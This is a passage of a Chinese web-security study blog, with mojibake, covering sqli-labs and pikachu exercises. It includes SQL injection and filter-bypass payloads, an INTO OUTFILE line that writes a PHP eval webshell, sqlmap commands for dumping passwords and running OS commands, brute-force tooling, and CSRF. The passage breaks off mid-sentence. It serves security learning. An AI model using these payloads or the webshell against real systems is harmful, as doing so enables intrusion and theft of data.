title="COOKIEå‹æ³¨å…¥ï¼š"></a>COOKIEå‹æ³¨å…¥ï¼š</h6><h6 id="XFFæ³¨å…¥ï¼š"><a href="#XFFæ³¨å…¥ï¼š" class="headerlink" title="XFFæ³¨å…¥ï¼š"></a>XFFæ³¨å…¥ï¼š</h6><h6 id="Clien-IPï¼š"><a href="#Clien-IPï¼š" class="headerlink" title="Clien-IPï¼š"></a>Clien-IPï¼š</h6><h6 id="user-agentæ³¨å…¥ï¼š"><a href="#user-agentæ³¨å…¥ï¼š" class="headerlink" title="user-agentæ³¨å…¥ï¼š"></a>user-agentæ³¨å…¥ï¼š</h6><h6 id="refereræ³¨å…¥ï¼š"><a href="#refereræ³¨å…¥ï¼š" class="headerlink" title="refereræ³¨å…¥ï¼š"></a>refereræ³¨å…¥ï¼š</h6><p>less-19ä¸­å­˜åœ¨refereræ³¨å…¥ï¼Œä»–æäº¤è¡¨å•ä¾ç„¶é‡‡ç”¨çš„æ˜¯postæ–¹å¼æäº¤ï¼Œä½†æ˜¯æ’å…¥sqlè¯­å¥çš„ä½ç½®æ˜¯åœ¨refererçš„å¤„è¿›è¡Œæ’å…¥</p><pre><code>&#39;or +ä»»æ„sqlæ³¨å…¥è¯­å¥ï¼ˆæŠ¥é”™æ³¨å…¥ï¼Œè”åˆæŸ¥è¯¢ç­‰ç­‰ï¼‰</code></pre><h4 id="å…¶ä»–æ³¨å…¥ï¼ˆdelectï¼‰ï¼š"><a href="#å…¶ä»–æ³¨å…¥ï¼ˆdelectï¼‰ï¼š" class="headerlink" title="å…¶ä»–æ³¨å…¥ï¼ˆdelectï¼‰ï¼š"></a>å…¶ä»–æ³¨å…¥ï¼ˆdelectï¼‰ï¼š</h4><p>pikachuæœ‰é¶åœº</p><p>sqlè¯­å¥ä¸­çš„åŸç†ï¼š</p><pre><code>delect from è¡¨æ˜ where id=xxx</code></pre><p>getä¼ å‚+æŠ¥é”™æ³¨å…¥</p><h4 id="sqlæ³¨å…¥è¯»å†™æ–‡ä»¶ï¼š"><a href="#sqlæ³¨å…¥è¯»å†™æ–‡ä»¶ï¼š" class="headerlink" title="sqlæ³¨å…¥è¯»å†™æ–‡ä»¶ï¼š"></a>sqlæ³¨å…¥è¯»å†™æ–‡ä»¶ï¼š</h4><p>åˆ©ç”¨çš„æ˜¯into outfileè¯­å¥</p><p>less-1åšæ¼”ç¤ºï¼š</p><p>å½“æƒé™ä¸º<strong>root</strong>ä¸”çŸ¥é“<strong>ç»å¯¹è·¯å¾„</strong>æ—¶ï¼Œå¯ä»¥ç›´æ¥å†™ä¸€å¥è¯æœ¨é©¬åˆ°æœåŠ¡å™¨ï¼Œæ³¨æ„å­˜åœ¨</p><pre><code>&#39;union select 1,2,&quot;&lt;?php eval($_POST[&#39;666&#39;]);?&gt;&quot;,into outfile &quot;E:\\phpstudy\\PHPTutorial\\WWW\\shell.php&quot;+--+</code></pre><p>ç„¶ååˆ©ç”¨èšå‰‘</p><p>åˆ©ç”¨load_fileè¯»å–æ–‡ä»¶ï¼š</p><pre><code>&#39;union select 1,2,@@basedir+--+</code></pre><p>è¯¥å‚æ•°æŒ‡å®šäº†å®‰è£… MySQL çš„å®‰è£…è·¯å¾„ï¼Œå¡«å†™å…¨è·¯å¾„å¯ä»¥è§£å†³ç›¸å¯¹è·¯å¾„æ‰€é€ æˆçš„é—®é¢˜ã€‚</p><pre><code>&#39;union select 1,2,@@dataedir+--+</code></pre><p>è¯¥å‚æ•°æŒ‡å®šäº† MySQL çš„æ•°æ®åº“æ–‡ä»¶æ”¾åœ¨ä»€ä¹ˆè·¯å¾„ä¸‹ã€‚æ•°æ®åº“æ–‡ä»¶å³æˆ‘ä»¬å¸¸è¯´çš„ MySQL data æ–‡ä»¶ã€‚</p><pre><code>&#39;union select 1,2,hex(load_file(&#39;E:\\phpstudy\\PHPTutorial\\WWW\\index.php&#39;))</code></pre><ul><li><h3 id="sqlæ³¨å…¥ç»•è¿‡ä¸é˜²å¾¡"><a href="#sqlæ³¨å…¥ç»•è¿‡ä¸é˜²å¾¡" class="headerlink" title="sqlæ³¨å…¥ç»•è¿‡ä¸é˜²å¾¡"></a>sqlæ³¨å…¥ç»•è¿‡ä¸é˜²å¾¡</h3></li></ul><h4 id="å¸¸è§çš„ç»•è¿‡æ€è·¯ï¼š"><a href="#å¸¸è§çš„ç»•è¿‡æ€è·¯ï¼š" class="headerlink" title="å¸¸è§çš„ç»•è¿‡æ€è·¯ï¼š"></a>å¸¸è§çš„ç»•è¿‡æ€è·¯ï¼š</h4><p>ç­‰ä»·æ›¿æ¢ã€åŒå†™ç»•è¿‡ã€å¤§å°å†™ç»•è¿‡ã€URLã€16è¿›åˆ¶ç­‰ç¼–ç ç»•è¿‡ã€å†…è”æ³¨é‡Šç»•è¿‡</p><p>ç»•è¿‡å•å¼•å·è¿‡æ»¤ï¼šä½¿ç”¨16è¿›åˆ¶ç¼–ç ã€æˆ–å®½å­—èŠ‚æ–¹å¼</p><p>ç»•è¿‡order byè¿‡æ»¤ï¼šunion select 1,2,3</p><p>ç»•è¿‡union selectè¿‡æ»¤ï¼šunion distinct select</p><p>ç»•è¿‡=å·è¿‡æ»¤ï¼šlikã€rlikeæ›¿æ¢</p><p>ç»•è¿‡selectåçš„ç©ºæ ¼è¿‡æ»¤ï¼šå¯ä»¥ä½¿ç”¨å•å¼•å·å°†selectåé¢å‚æ•°åŒ…è£¹</p><pre><code>union distinct select&#39;1&#39;,2,3;union distinct (select&#39;1&#39;,2,3);</code></pre><p>ç»•è¿‡from+ç©ºæ ¼è¿‡æ»¤ï¼šfrom{x è¡¨å}</p><p>ç»•è¿‡å¤§äºå°äºï¼šä½¿ç”¨inã€between a and b(èŒƒå›´åœ¨a-bä¹‹é—´)</p><pre><code>1 and substr(user(),1,1) in (&#39;a&#39;);select * from users where id between 1 and 2; </code></pre><p>ç»•è¿‡é€—å·è¿‡æ»¤ï¼šjoinã€from pos for len(ä»£è¡¨ä»posä¸ªå¼€å§‹è¯»å–lené•¿åº¦çš„å­ä¸²) ç»•è¿‡</p><pre><code>union select * from (select 1)a join(select 2)b join(select 3)c join(select 4)d</code></pre><p>ç­‰ä»·äº</p><pre><code>union select 1,2,3,4 from pos for len</code></pre><p>(ä»£è¡¨ä»posä¸ªå¼€å§‹è¯»å–lené•¿åº¦çš„å­ä¸²)</p><p>ç»•è¿‡limitä¸­çš„é€—å·è¿‡æ»¤ï¼šä½¿ç”¨offsetå…³é”®å­—ï¼Œlimit2,1ç­‰ä»·äºlimit 1offset 2, offsetx æ˜¯åç§»xä¸ªæ•°æ®</p><p>ç»•è¿‡sleepå‡½æ•°è¿‡æ»¤ï¼šbenchmark()å‡½æ•°æ›¿æ¢ï¼Œbenchmarkå‡½æ•°å¯ä»¥æµ‹è¯•æŸäº›æ“ä½œçš„æ‰§è¡Œé€Ÿåº¦ï¼Œå‚æ•°å¯ä»¥æ˜¯éœ€è¦æ‰§è¡Œçš„æ¬¡æ•°å’Œè¡¨è¾¾å¼ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ‰§è¡Œæ¬¡æ•°ï¼Œç¬¬äºŒä¸ªæ‰§è¡Œçš„è¡¨è¾¾å¼benchmark(1000000000000ï¼Œ1)</p><p>ç»•è¿‡group_concatçš„è¿‡æ»¤ï¼šconcat_wsä»£æ›¿</p><h4 id="less-23ï¼šè¿‡æ»¤äº†æ³¨é‡Šç¬¦"><a href="#less-23ï¼šè¿‡æ»¤äº†æ³¨é‡Šç¬¦" class="headerlink" title="less-23ï¼šè¿‡æ»¤äº†æ³¨é‡Šç¬¦"></a>less-23ï¼šè¿‡æ»¤äº†æ³¨é‡Šç¬¦</h4><p>è”åˆæŸ¥è¯¢å’ŒæŠ¥é”™æ³¨å…¥å®ç°è¯­å¥æ‹¼æ¥æ¥è¿›è¡Œç ´è§£</p><pre><code>1&#39;union select 1,2,3&#39;</code></pre><p>ä¸»è¦å°±æ˜¯åˆ©ç”¨äº†é—­åˆå•å¼•å·ï¼Œä½¿æŸ¥è¯¢è¯­å¥ä¸ä½œä¸ºå­—ç¬¦ä¸²å‡ºç°</p><h4 id="less-25ï¼šé’ˆå¯¹andå’Œorè¿›è¡Œäº†è¿‡æ»¤"><a href="#less-25ï¼šé’ˆå¯¹andå’Œorè¿›è¡Œäº†è¿‡æ»¤" class="headerlink" title="less-25ï¼šé’ˆå¯¹andå’Œorè¿›è¡Œäº†è¿‡æ»¤"></a>less-25ï¼šé’ˆå¯¹andå’Œorè¿›è¡Œäº†è¿‡æ»¤</h4><p>é‡‡ç”¨åŒå†™å¤§å°å†™ç»•è¿‡</p><p>é‡‡ç”¨ç­‰ä»·æ›¿æ¢çš„æ–¹å¼ï¼š&amp;&amp;ã€||ã€|(å¼‚æˆ–)</p><p>é‡‡ç”¨è”åˆæŸ¥è¯¢æ¥æ‹¼æ¥è¯­å¥ï¼Œé€šè¿‡é—­åˆå•å¼•å·æ¥å®ç°</p><pre><code>-1&#39;union select 1,user(),3&#39;</code></pre><h4 id="less-26ï¼šè¿‡æ»¤ç©ºæ ¼"><a href="#less-26ï¼šè¿‡æ»¤ç©ºæ ¼" class="headerlink" title="less-26ï¼šè¿‡æ»¤ç©ºæ ¼"></a>less-26ï¼šè¿‡æ»¤ç©ºæ ¼</h4><p>ç­‰ä»·æ›¿æ¢ï¼š</p><p>%09 TABé”®(æ°´å¹³)</p><p>%0a  æ–°å»ºä¸€è¡Œï¼Œå›è½¦</p><p>%0b TABé”®(å‚ç›´)</p><p>%0c æ–°çš„ä¸€é¡µ</p><p>%0d returnåŠŸèƒ½</p><p>%a0 ç©ºæ ¼</p><p>%00 ç©ºå­—èŠ‚</p><p>/**/ æ³¨é‡Šä»£æ›¿ç©ºæ ¼</p><p>/!**/ å†…è”æ³¨é‡Š</p><p>()      åŒ…è£¹å‚æ•°</p><p>``    åå¼•å·åŒ…è£¹å‚æ•° </p><h4 id="less-27ï¼šè¿‡æ»¤äº†unionå’Œselect"><a href="#less-27ï¼šè¿‡æ»¤äº†unionå’Œselect" class="headerlink" title="less-27ï¼šè¿‡æ»¤äº†unionå’Œselect"></a>less-27ï¼šè¿‡æ»¤äº†unionå’Œselect</h4><p>é‡‡ç”¨åŒå†™ã€å¤§å°å†™ç»•è¿‡</p><h4 id="é˜²å¾¡æ€è·¯ï¼š"><a href="#é˜²å¾¡æ€è·¯ï¼š" class="headerlink" title="é˜²å¾¡æ€è·¯ï¼š"></a>é˜²å¾¡æ€è·¯ï¼š</h4><h5 id="ä»£ç å±‚é˜²å¾¡ï¼š"><a href="#ä»£ç å±‚é˜²å¾¡ï¼š" class="headerlink" title="ä»£ç å±‚é˜²å¾¡ï¼š"></a>ä»£ç å±‚é˜²å¾¡ï¼š</h5><p>é»‘åå•ï¼šä¸å…è®¸xxxè¿›å…¥</p><p>ç™½åå•ï¼šåªå…è®¸xxxè¿›å…¥</p><p>å­—ç¬¦è¿‡æ»¤</p><p>è§„èŒƒè¾“å‡º</p><h5 id="é…ç½®å±‚ï¼š"><a href="#é…ç½®å±‚ï¼š" class="headerlink" title="é…ç½®å±‚ï¼š"></a>é…ç½®å±‚ï¼š</h5><p>å¼€å¯gpc</p><p>ä½¿ç”¨utf-8</p><h5 id="ç‰©ç†å±‚ï¼š"><a href="#ç‰©ç†å±‚ï¼š" class="headerlink" title="ç‰©ç†å±‚ï¼š"></a>ç‰©ç†å±‚ï¼š</h5><p>waf(è½¯/ç¡¬waf)</p><p>äº‘é˜²æŠ¤(æ•°æ®æ¸…ç†)</p><p>ips(å…¥ä¾µé˜²å¾¡ç³»ç»Ÿ)</p><ul><li><h3 id="burpè®²è§£"><a href="#burpè®²è§£" class="headerlink" title="burpè®²è§£"></a>burpè®²è§£</h3></li><li><h3 id="sqlæ³¨å…¥ä¹‹sqlmap"><a href="#sqlæ³¨å…¥ä¹‹sqlmap" class="headerlink" title="sqlæ³¨å…¥ä¹‹sqlmap"></a>sqlæ³¨å…¥ä¹‹sqlmap</h3></li></ul><p>åŸºäºpython2çš„ç¯å¢ƒä¸‹ï¼š<a href="https://blog.csdn.net/destinymf/article/details/80656996?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&dist_request_id=1328740.12990.16168352186468463&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control" target="_blank" rel="noopener">PythonåŒç¯å¢ƒå®‰è£…</a></p><p>Python2.7.16å’Œ3.7.0</p><p><a href="https://blog.csdn.net/qq_33530840/article/details/82144515" target="_blank" rel="noopener">sqlmapä½¿ç”¨æ•™ç¨‹</a>ï¼š</p><p><a href="https://blog.csdn.net/smli_ng/article/details/106026901" target="_blank" rel="noopener">sqlmapè¯¦ç»†ä½¿ç”¨æ•™ç¨‹</a></p><h4 id="æ³¨å…¥åˆ¤æ–­ï¼š"><a href="#æ³¨å…¥åˆ¤æ–­ï¼š" class="headerlink" title="æ³¨å…¥åˆ¤æ–­ï¼š"></a>æ³¨å…¥åˆ¤æ–­ï¼š</h4><p>sqlmap.py -u urlåˆ¤æ–­å…¶phpç‰ˆæœ¬ï¼ŒæœåŠ¡ç³»ç»Ÿ</p><p>sqlmap.py -r [æ–‡æœ¬çš„è·¯å¾„]å¯ä»¥å°†burpæŠ“åˆ°çš„åŒ…ä¸­çš„å†…å®¹ç¼–è¾‘åˆ°æ­¤æ–‡æœ¬ä¸­</p><h4 id="åŸºæœ¬ä½¿ç”¨ï¼š"><a href="#åŸºæœ¬ä½¿ç”¨ï¼š" class="headerlink" title="åŸºæœ¬ä½¿ç”¨ï¼š"></a>åŸºæœ¬ä½¿ç”¨ï¼š</h4><p>æŸ¥è¯¢å½“å‰ç«™ç‚¹çš„æ•°æ®åº“ï¼š</p><p><strong>sqlmap.py -u url â€“current-db</strong></p><p>æŸ¥è¯¢å½“å‰ç”¨æˆ·ä¸‹çš„æ‰€æœ‰æ•°æ®åº“ï¼š</p><p><strong>sqlmap.py -u url â€“db</strong></p><p>æŸ¥è¯¢æ•°æ®åº“ä¸­çš„è¡¨æ˜ï¼š</p><p><strong>sqlmap.py -u url -D dbname â€“tables</strong></p><p>æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µåï¼š</p><p><strong>sqlmap.py -u url -D dbname -T tablename â€“culumns</strong></p><p>æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µå†…å®¹ï¼š</p><p><strong>sqlmap.py -u url -D dbname -T tablename -C columnname â€“dump</strong></p><p>æŸ¥è¯¢æ•°æ®åº“çš„æ‰€æœ‰ç”¨æˆ·(å½“å‰ç”¨æˆ·æœ‰è¯»æƒé™)ï¼š</p><p><strong>sqlmap.py -u url â€“users</strong></p><p>æŸ¥è¯¢æ•°æ®åº“ç”¨æˆ·çš„å¯†ç ï¼š</p><p><strong>sqlmap.py -u url â€“password</strong></p><p>å½“å‰æ•°æ®åº“ç”¨æˆ·åç§°ï¼š</p><p><strong>sqlmap.py -u url â€“current-users</strong></p><p>æŒ‡å®šæ•°æ®åº“ç±»å‹ï¼š</p><p><strong>sqlmap.py -u url â€“dbms=mysql/oracle/mssql</strong></p><h4 id="è¿›é˜¶ä½¿ç”¨ï¼š"><a href="#è¿›é˜¶ä½¿ç”¨ï¼š" class="headerlink" title="è¿›é˜¶ä½¿ç”¨ï¼š"></a>è¿›é˜¶ä½¿ç”¨ï¼š</h4><p>â€“level1:get post</p><p>â€“level2:å¢åŠ cookie</p><p>â€“level3:å¢åŠ user-agent/referer</p><p>â€“level4:æ›´å¤šçš„payload</p><p>â€“level5:æœ€é«˜ç­‰çº§ï¼ŒåŒ…å«æ‰€æœ‰çš„payloadï¼Œä¼šå°è¯•è‡ªåŠ¨ç ´è§£å‡ºcookieï¼Œxffç­‰å¤´éƒ¨æ³¨å…¥ã€‚</p><h5 id="æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ï¼š"><a href="#æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ï¼š" class="headerlink" title="æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ï¼š"></a>æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ï¼š</h5><p>-vçš„7ä¸ªçº§åˆ«ï¼š</p><p> 0ï¼šåªæ˜¾ç¤ºpythoné”™è¯¯ä»¥åŠé‡è¦ä¿¡æ¯</p><p>1ï¼šæ˜¾ç¤ºä¿¡æ¯ä»¥åŠè­¦å‘Š</p><p>2ï¼šæ˜¾ç¤ºdebugæ¶ˆæ¯</p><p>3ï¼šæ˜¾ç¤ºæ³¨å…¥payload</p><p>4ï¼šæ˜¾ç¤ºhttpè¯·æ±‚</p><p>5ï¼šæ˜¾ç¤ºhttpå“åº”å¤´Â·</p><p>6ï¼šæ˜¾ç¤ºhttpå“åº”å†…å®¹</p><h5 id="åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜ï¼š"><a href="#åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜ï¼š" class="headerlink" title="åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜ï¼š"></a>åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜ï¼š</h5><p>â€“is-dba:è¿”å›trueæ—¶ä¸ºrootï¼Œå¦åˆ™è¿”å›false</p><p>â€“roles               æšä¸¾DBMSç”¨æˆ·çš„è§’è‰²ï¼Œçœ‹æƒé™ï¼Œ-Uå¯è¿›è¡ŒæŒ‡å®šï¼Œä½†æ˜¯ä»…é€‚ç”¨äºå½“å‰æ•°æ®åº“æ˜¯Oracleçš„æ—¶å€™</p><h5 id="ä¼ªé€ refererå¤´ï¼š"><a href="#ä¼ªé€ refererå¤´ï¼š" class="headerlink" title="ä¼ªé€ refererå¤´ï¼š"></a>ä¼ªé€ refererå¤´ï¼š</h5><p>â€“refererï¼šå½“ç­‰çº§çº§åˆ«åœ¨3æˆ–3ä»¥ä¸Šæ—¶ï¼Œä¼šå°è¯•refereræ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨â€“refereræ¥ä¼ªé€ refereræ¥æº</p><p><strong>æ‰§è¡Œè‡ªå®šä¹‰çš„sqlè¯­å¥ï¼š</strong></p><p>â€“sql-shellï¼šæ‰§è¡Œè‡ªå®šä¹‰sqlè¯­å¥</p><p><strong>è¿è¡Œç³»ç»Ÿå‘½ä»¤(éäº¤äº’å¼)ï¼š</strong></p><p>â€“os-cmd=å‘½ä»¤ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p>è¿™é‡Œæœ‰ä¸ªå‰æï¼Œéœ€è¦æ˜¯rootç”¨æˆ·ï¼Œå¿…é¡»çŸ¥é“ç»å¯¹è·¯å¾„ï¼Œä¸”éäº¤äº’å¼ã€‚</p><p>ä¸Šä¼ æ–‡ä»¶åˆ°æ•°æ®åº“æœåŠ¡å™¨ä¸­(root)ï¼š</p><p><strong>sqlmap.py -u url â€“file-write=æœ¬åœ°æ–‡ä»¶è·¯å¾„ â€“file-dest ç½‘ç«™è·¯å¾„(å†™å…¥è·¯å¾„)+â€/å†™å…¥çš„æ–‡ä»¶åâ€</strong></p><p><a href="https://blog.csdn.net/qq_34335450/article/details/106733489" target="_blank" rel="noopener">sqlæ³¨å…¥é£é™©æœ€ç®€å•ä¿®å¤æ–¹æ³•</a></p><p>æœ€å¥½çš„è¿˜æ˜¯è£…ä¸€waf</p><ul><li><h3 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç ´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h3></li></ul><h4 id="åŸºäºb-sæ¶æ„çš„æš´åŠ›ç ´è§£ï¼š"><a href="#åŸºäºb-sæ¶æ„çš„æš´åŠ›ç ´è§£ï¼š" class="headerlink" title="åŸºäºb/sæ¶æ„çš„æš´åŠ›ç ´è§£ï¼š"></a>åŸºäºb/sæ¶æ„çš„æš´åŠ›ç ´è§£ï¼š</h4><h5 id="åˆ†ç±»ï¼š"><a href="#åˆ†ç±»ï¼š" class="headerlink" title="åˆ†ç±»ï¼š"></a>åˆ†ç±»ï¼š</h5><p>ç™»å½•æ¡†(ç”¨æˆ·åå’Œå¯†ç )</p><p>URLå‚æ•°(ç”¨æˆ·IDå€¼ã€ç›®å½•åã€å‚æ•°åç­‰)</p><p>éªŒè¯ç (éªŒè¯ç æ¥æ”¶å¤„)</p><h5 id="å¼±å£ä»¤ï¼š"><a href="#å¼±å£ä»¤ï¼š" class="headerlink" title="å¼±å£ä»¤ï¼š"></a>å¼±å£ä»¤ï¼š</h5><h5 id="çˆ†ç ´ç‚¹ï¼š"><a href="#çˆ†ç ´ç‚¹ï¼š" class="headerlink" title="çˆ†ç ´ç‚¹ï¼š"></a>çˆ†ç ´ç‚¹ï¼š</h5><p>ç½‘ç«™æ ¹ç›®å½•ä¸‹æ‰¾åå°ç®¡ç†åœ°å€</p><p>æ—ç«™</p><p>ä½¿ç”¨äºŒçº§åŸŸå</p><p>å…¶ä»–æœåŠ¡å™¨</p><h5 id="åå°æŸ¥æ‰¾æ–¹æ³•ï¼š"><a href="#åå°æŸ¥æ‰¾æ–¹æ³•ï¼š" class="headerlink" title="åå°æŸ¥æ‰¾æ–¹æ³•ï¼š"></a>åå°æŸ¥æ‰¾æ–¹æ³•ï¼š</h5><h6 id="åœ¨å½“å‰ç½‘ç«™ï¼š"><a href="#åœ¨å½“å‰ç½‘ç«™ï¼š" class="headerlink" title="åœ¨å½“å‰ç½‘ç«™ï¼š"></a>åœ¨å½“å‰ç½‘ç«™ï¼š</h6><p>å­—å…¸æš´åŠ›ç ´è§£ï¼š<a href="https://blog.csdn.net/u012804180/article/details/51932863" target="_blank" rel="noopener">aspã€aspxã€phpã€jspä¸‡èƒ½å¯†ç å¤§å…¨</a></p><p>çˆ¬è¡Œ</p><p>è°·æ­Œ hack</p><p>ç½‘ç«™èµ„æºåˆ©ç”¨(robots.txtã€å›¾ç‰‡é“¾æ¥åœ°å€ç­‰)</p><p>é€šç”¨cmsç‰¹æ€§</p><p>ä¿¡æ¯æ³„éœ²(SVNã€gitç­‰)</p><h6 id="ä¸åœ¨å½“å‰ç½‘ç«™ï¼š"><a href="#ä¸åœ¨å½“å‰ç½‘ç«™ï¼š" class="headerlink" title="ä¸åœ¨å½“å‰ç½‘ç«™ï¼š"></a>ä¸åœ¨å½“å‰ç½‘ç«™ï¼š</h6><p>äºŒçº§åŸŸå-å­åŸŸåæš´åŠ›ç ´è§£</p><p>ç«¯å£ï¼šnmapæ‰«æ</p><p>cæ®µæ‰«æ</p><h4 id="åŸºäºc-sæ¶æ„çš„æš´åŠ›ç ´è§£ï¼š"><a href="#åŸºäºc-sæ¶æ„çš„æš´åŠ›ç ´è§£ï¼š" class="headerlink" title="åŸºäºc/sæ¶æ„çš„æš´åŠ›ç ´è§£ï¼š"></a>åŸºäºc/sæ¶æ„çš„æš´åŠ›ç ´è§£ï¼š</h4><h5 id="åˆ†ç±»ï¼š-1"><a href="#åˆ†ç±»ï¼š-1" class="headerlink" title="åˆ†ç±»ï¼š"></a>åˆ†ç±»ï¼š</h5><p>Windowsè¿œç¨‹æ¡Œé¢</p><p>sshè¿œç¨‹æ¡Œé¢</p><p>æ•°æ®åº“è´¦å·å¯†ç </p><p>ftpè´¦å·å¯†ç </p><h5 id="æµç¨‹ï¼š"><a href="#æµç¨‹ï¼š" class="headerlink" title="æµç¨‹ï¼š"></a>æµç¨‹ï¼š</h5><p>ç¡®å®šæ”»å‡»ç›®æ ‡ï¼Œéœ€è¦è´¦å·å¯†ç è¾“å…¥çš„åœ°æ–¹</p><p>å»ºç«‹socketé€šä¿¡(å¤šçº¿ç¨‹)</p><p>è¾“å…¥è´¦å·(ä¸€èˆ¬ä¸ºé»˜è®¤è´¦å·)</p><p>é€šè¿‡å­—å…¸æˆ–è§„åˆ™ç”Ÿæˆå¾…æµ‹è¯•çš„å¯†ç </p><p>å‘é€é¢è†œï¼Œå–å¾—éªŒè¯</p><p>æ‹’ç»å¯†ç ï¼Œé‡å¤ç¬¬å››éƒ¨ï¼ŒçŸ¥é“å¯†ç æ­£ç¡®</p><h5 id="çˆ†ç ´åˆ©å™¨ï¼š"><a href="#çˆ†ç ´åˆ©å™¨ï¼š" class="headerlink" title="çˆ†ç ´åˆ©å™¨ï¼š"></a>çˆ†ç ´åˆ©å™¨ï¼š</h5><p><a href="https://blog.csdn.net/smli_ng/article/details/106089614" target="_blank" rel="noopener">hydra(æµ·å¾·æ‹‰)</a></p><p>å…¶å‡ ä¹èƒ½çˆ†ç ´è¿‘ä¹æ‰€æœ‰çš„åè®®</p><p>è¶…çº§å¼±å£ä»¤æ£€æŸ¥å·¥å…·</p><h4 id="ç”Ÿæˆå­—å…¸ï¼š"><a href="#ç”Ÿæˆå­—å…¸ï¼š" class="headerlink" title="ç”Ÿæˆå­—å…¸ï¼š"></a>ç”Ÿæˆå­—å…¸ï¼š</h4><h5 id="Windowsä¸‹å­—å…¸ç”Ÿæˆå·¥å…·ï¼š"><a href="#Windowsä¸‹å­—å…¸ç”Ÿæˆå·¥å…·ï¼š" class="headerlink" title="Windowsä¸‹å­—å…¸ç”Ÿæˆå·¥å…·ï¼š"></a>Windowsä¸‹å­—å…¸ç”Ÿæˆå·¥å…·ï¼š</h5><p>æ˜“ä¼˜ã€å“è½©</p><h5 id="Linuxä¸‹å­—å…¸ç”Ÿæˆå·¥å…·ï¼š"><a href="#Linuxä¸‹å­—å…¸ç”Ÿæˆå·¥å…·ï¼š" class="headerlink" title="Linuxä¸‹å­—å…¸ç”Ÿæˆå·¥å…·ï¼š"></a>Linuxä¸‹å­—å…¸ç”Ÿæˆå·¥å…·ï¼š</h5><p><a href="https://blog.csdn.net/tb_youth/article/details/103264234" target="_blank" rel="noopener">crunch</a>ã€cewlã€cupp</p><ul><li><h3 id="csrfæ¼æ´"><a href="#csrfæ¼æ´" class="headerlink" title="csrfæ¼æ´"></a>csrfæ¼æ´</h3></li></ul><p>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç»ç™»å½•çš„çš„webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•ï¼Œè·Ÿxssç›¸æ¯”ï¼Œxssåˆ©ç”¨çš„æ˜¯ç”¨æˆ·å¯¹æŒ‡å®šç½‘ç«™çš„ä¿¡ä»»ï¼Œcsrfåˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·é¡µé¢æµè§ˆå™¨çš„ä¿¡ä»»ã€‚æœ€å¤§çš„å»å‘—å°±æ˜¯csrfæ²¡æœ‰ç›—å–ç”¨æˆ·çš„cookieï¼Œè€Œæ˜¯ç›´æ¥çš„åˆ©ç”¨çš„æµè§ˆå™¨å‚¨å­˜cookieè®©ç”¨å»æ‰§è¡ŒæŸä¸ªåŠ¨ä½œã€‚</p><h4 id="pikachué¶åœºï¼š"><a href="#pikachué¶åœºï¼š" class="headerlink" title="pikachué¶åœºï¼š"></a>pikachué¶åœºï¼š</h4><h5 id="getå‹ï¼š"><a href="#getå‹ï¼š" class="headerlink" title="getå‹ï¼š"></a>getå‹ï¼š</h5><p>åˆ©ç”¨ä¸¤ä¸ªæµè§ˆå™¨ï¼Œåœ¨æœç‹—å°†ä¸€ä¸ªè´¦å·åœ¨æäº¤æ—¶ï¼Œæ‰€åœ¨URLæ è¦åˆ©ç”¨çš„ä¿¡æ¯ï¼Œå¤åˆ¶åˆ°ç«ç‹æµè§ˆå™¨çš„URLä¸­ï¼Œå°±å¯ä»¥å®ç°ä¿®æ”¹ç‚¹å‡»æ­¤é“¾æ¥çš„ç”¨æˆ·ä¿¡æ¯</p><h5 id="postå‹ï¼š"><a href="#postå‹ï¼š" class="headerlink" title="postå‹ï¼š"></a>postå‹ï¼š</h5><p>é€šè¿‡æœç‹—æµè§ˆå™¨æŠ“åŒ…ç”Ÿæˆpocç”¨ç¼–è¾‘å™¨ç”Ÿæˆhtmlæ–‡ä»¶ï¼Œå°†æ‰“å¼€æ–¹å¼è®¾ç½®ä¸ºç«ç‹çš„æ‰“å¼€æ–¹å¼ï¼Œæ‰“å¼€åç‚¹å‡»è¯·æ±‚å³å¯å®ç°</p><h5 id="csrfæ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š"><a href="#csrfæ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š" class="headerlink" title="csrfæ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š"></a>csrfæ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š</h5><p>è¢«å®³ç”¨æˆ·å·²ç»å®Œæˆèº«ä»½è®¤è¯</p><p>æ–°è¯·æ±‚çš„æäº¤ä¸éœ€è¦é‡æ–°èº«ä»½è®¤è¯æˆ–ç¡®è®¤æœºåˆ¶</p><p>æ”»å‡»è€…å¿…é¡»äº†è§£web app è¯·æ±‚çš„å‚æ•°æ„é€ </p><p>è¯±ä½¿ç”¨æˆ·è§¦å‘æ”»å‡»çš„æŒ‡ä»¤(ç¤¾å·¥)</p><h5 id="æŒ–æ˜æ–¹æ³•ï¼š"><a href="#æŒ–æ˜æ–¹æ³•ï¼š" class="headerlink" title="æŒ–æ˜æ–¹æ³•ï¼š"></a>æŒ–æ˜æ–¹æ³•ï¼š</h5><p>å¯†ç ä¿®æ”¹å¤„ã€ç‚¹èµã€è½¬è´¦ã€æ³¨é”€ã€åˆ 